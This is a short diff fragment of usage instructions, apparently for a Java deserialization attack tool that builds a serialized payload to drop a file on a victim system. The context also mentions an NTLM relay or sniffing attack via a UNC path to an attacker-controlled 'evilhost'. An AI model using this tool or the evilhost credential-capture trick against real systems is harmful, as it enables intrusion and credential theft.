@@ -15,9 +15,9 @@ Also we can perform a NTLM-relay/sniffing attack (using \\\\evilhost\\any\\path)
   At first, we create a serialized payload:
   java -jar aced_cup.jar /path/payload /path/target /path/out 1
   
-  /path/payload - a *path* to a file with your payload
-  /path/target - a *path* to a file that will be created in your victim (this will be stored in the serialized payload)
-  /path/out - a *path* to a file with serialized payload
+  /path/payload - a path to a file with your payload
+  /path/target - a path to a file that will be created in your victim (this will be stored in the serialized payload)
+  /path/out - a path to a file with serialized payload
   0 - turn off null-byte ending if you attack a patched system (with null by default)
 
   2)
